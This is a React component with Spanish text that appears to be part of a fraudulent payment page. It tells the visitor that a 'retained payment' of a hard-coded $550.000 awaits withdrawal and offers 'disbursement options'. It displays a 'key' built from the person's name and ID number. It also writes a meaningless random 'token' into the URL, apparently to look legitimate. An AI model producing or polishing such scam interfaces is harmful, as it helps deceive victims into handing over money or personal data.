import React, { useState, useEffect } from 'react';

function PaymentPending({ userData, onShowOptions }) {
  const [generatedKey, setGeneratedKey] = useState('');
  const [censoredEmail, setCensoredEmail] = useState('');

  useEffect(() => {
    try {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let token = '';
      for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      const base64Token = btoa(token + Date.now()).replace(/=/g, '');
      const url = new URL(window.location.href);
      url.searchParams.set('token', base64Token);
      window.history.replaceState(null, '', url.toString());
    } catch(e) {}
  }, []);

  useEffect(() => {
    if (userData) {
      // Generar llave: Primer Nombre + Primer Apellido + 3 últimos dígitos cédula
      const parts = userData.nombre.trim().split(/\s+/);
      const firstName = parts[0] || '';
      const lastName = parts.length > 1 ? parts[1] : '';
      const lastThreeCedula = userData.cedula.slice(-3);
      
      const key = `${firstName}${lastName}${lastThreeCedula}`.toUpperCase();
      setGeneratedKey(key);

      // Censurar correo: andres1***@gmail.com
      const emailParts = userData.email.split('@');
      if (emailParts.length === 2) {
        const name = emailParts[0];
        const domain = emailParts[1];
        // Mostrar primeros 6 caracteres si es largo, o menos si es corto, luego ***
        const visibleLen = Math.min(6, Math.max(2, name.length - 3));
        const visiblePart = name.substring(0, visibleLen);
        setCensoredEmail(`${visiblePart}***@${domain}`);
      } else {
        setCensoredEmail(userData.email);
      }
    }
  }, [userData]);

  return (
    <div className="w-full max-w-md z-10 flex flex-col items-center">
      
      {/* Mensaje Superior de Llave */}
      <div className="text-center mb-6 animate-fade-in">
        <h3 className="text-white font-bold text-sm tracking-wider mb-2">TU LLAVE</h3>
        <div className="bg-white/10 border border-white/20 rounded-full px-8 py-2 mb-2 backdrop-blur-sm shadow-[0_0_15px_rgba(0,255,200,0.15)]">
            <span className="text-2xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-white tracking-widest" style={{ textShadow: '0 2px 4px rgba(0,0,0,0.3)' }}>
                {generatedKey || 'GENERANDO...'}
            </span>
        </div>
        <h3 className="text-white font-bold text-sm tracking-wider">TIENE UN</h3>
        <h3 className="text-white font-bold text-lg tracking-wider mt-1">SALDO PENDIENTE POR RETIRAR</h3>
      </div>

      {/* Tarjeta Principal */}
      <div className="bg-white rounded-[2.5rem] p-6 w-full shadow-2xl relative overflow-hidden">
        
        <p className="text-gray-400 text-sm text-center mb-6">
          Estamos procesando tus transacciones de forma segura.
        </p>

        {/* Correo Registrado (Read-only) */}
        <div className="mb-4">
            <label className="block text-xs font-bold text-gray-400 mb-1 ml-4">
                Correo registrado (seguro)
            </label>
            <div className="w-full bg-[#f0f2f5] text-gray-800 font-semibold text-base rounded-2xl px-5 py-4 border-none">
                {censoredEmail}
            </div>
        </div>

        {/* Sección Verde de Pago */}
        <div className="bg-[#00cba0] rounded-2xl p-6 text-center mb-6 shadow-lg transform hover:scale-[1.02] transition-transform duration-300">
            <h4 className="text-white text-xs font-bold tracking-widest mb-1 opacity-90">
                TIENES UN PAGO RETENIDO DE:
            </h4>
            <div className="text-white font-extrabold text-4xl drop-shadow-md">
                $ 550.000
            </div>
        </div>

        {/* Botón Morado */}
        <button 
            onClick={onShowOptions}
            className="w-full bg-[#6236ff] text-white font-bold text-lg py-4 rounded-full shadow-lg hover:bg-[#5225ef] transition-colors hover:shadow-xl hover:-translate-y-0.5 transform duration-200"
        >
            Ver opciones de desembolso
        </button>

      </div>
    </div>
  );
}

export default PaymentPending;
